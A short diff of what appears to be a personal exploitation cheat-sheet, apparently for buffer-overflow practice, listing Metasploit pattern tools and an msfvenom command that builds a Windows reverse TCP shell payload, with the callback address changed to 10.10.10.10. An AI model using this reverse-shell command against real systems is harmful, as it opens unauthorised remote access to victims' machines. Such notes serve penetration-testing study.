@@ -72,7 +72,7 @@ readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
 Create pattern: /opt/metasploit-framework/tools/exploit/pattern_create.rb -l 100  
 Pattern Offset: /opt/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x0000000  
 
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.141 LPORT=443 -f python -b "\x00" -v shell  
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f python -b "\x00" -v shell  
 
 
 PSChangeUser  
